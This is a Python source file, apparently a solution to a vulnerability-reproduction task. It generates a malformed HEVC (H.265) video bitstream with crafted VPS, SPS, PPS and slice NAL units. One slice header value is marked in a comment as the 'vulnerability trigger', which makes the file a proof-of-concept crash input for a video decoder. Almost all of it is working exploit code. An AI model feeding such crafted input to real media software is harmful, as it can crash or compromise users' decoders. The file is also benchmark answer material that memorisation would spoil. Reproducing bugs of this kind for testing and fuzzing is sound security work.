import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitWriter:
            def __init__(self):
                self.data = bytearray()
                self.byte = 0
                self.bit_count = 0
            
            def write_bit(self, val):
                self.byte = (self.byte << 1) | (val & 1)
                self.bit_count += 1
                if self.bit_count == 8:
                    self.data.append(self.byte)
                    self.byte = 0
                    self.bit_count = 0
            
            def write_bits(self, val, n):
                for i in range(n - 1, -1, -1):
                    self.write_bit((val >> i) & 1)
            
            def write_ue(self, val):
                if val == 0:
                    self.write_bit(1)
                    return
                x = val + 1
                length = x.bit_length()
                for _ in range(length - 1):
                    self.write_bit(0)
                self.write_bits(x, length)
            
            def write_se(self, val):
                if val <= 0:
                    code = -2 * val
                else:
                    code = 2 * val - 1
                self.write_ue(code)
            
            def rbsp_trailing_bits(self):
                self.write_bit(1)
                while self.bit_count > 0:
                    self.write_bit(0)
            
            def get_bytes(self):
                return bytes(self.data)

        def write_ptl(bw):
            bw.write_bits(0, 2) 
            bw.write_bit(0)     
            bw.write_bits(1, 5) 
            bw.write_bits(0xffffffff, 32)
            bw.write_bits(0, 48) 
            bw.write_bits(30, 8) 

        def write_nal(nal_type, payload):
            out = bytearray(b'\x00\x00\x00\x01')
            h1 = (0 << 7) | (nal_type << 1) | 0
            h2 = 1 
            out.append(h1)
            out.append(h2)
            
            ep_payload = bytearray()
            zero_count = 0
            for b in payload:
                if zero_count >= 2 and b <= 3:
                    ep_payload.append(3)
                    zero_count = 0
                ep_payload.append(b)
                if b == 0:
                    zero_count += 1
                else:
                    zero_count = 0
            out.extend(ep_payload)
            return out

        # VPS
        bw = BitWriter()
        bw.write_bits(0, 4) 
        bw.write_bit(1) 
        bw.write_bit(1) 
        bw.write_bits(0, 6) 
        bw.write_bits(0, 3) 
        bw.write_bit(1) 
        bw.write_bits(0xffff, 16) 
        write_ptl(bw)
        bw.write_bit(1) 
        bw.write_ue(1) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_bits(0, 6) 
        bw.write_ue(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.rbsp_trailing_bits()
        vps_bytes = bw.get_bytes()

        # SPS
        bw = BitWriter()
        bw.write_bits(0, 4) 
        bw.write_bits(0, 3) 
        bw.write_bit(1) 
        write_ptl(bw)
        bw.write_ue(0) 
        bw.write_ue(1) 
        bw.write_ue(64) 
        bw.write_ue(64) 
        bw.write_bit(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_bit(1) 
        bw.write_ue(1) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_ue(1) 
        bw.write_bit(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.rbsp_trailing_bits()
        sps_bytes = bw.get_bytes()

        # PPS
        bw = BitWriter()
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bits(0, 3) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_ue(0) 
        bw.write_ue(0) 
        bw.write_se(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_se(0) 
        bw.write_se(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.write_ue(0) 
        bw.write_bit(0) 
        bw.write_bit(0) 
        bw.rbsp_trailing_bits()
        pps_bytes = bw.get_bytes()

        # Slice
        bw = BitWriter()
        bw.write_bit(1) 
        bw.write_ue(0) 
        bw.write_ue(1) 
        bw.write_bits(0, 4) 
        bw.write_bit(1) 
        bw.write_bit(1) 
        bw.write_ue(200) # Vulnerability trigger
        bw.write_se(0) 
        bw.rbsp_trailing_bits()
        slice_bytes = bw.get_bytes()

        data = write_nal(32, vps_bytes)
        data += write_nal(33, sps_bytes)
        data += write_nal(34, pps_bytes)
        data += write_nal(1, slice_bytes)
        
        return bytes(data)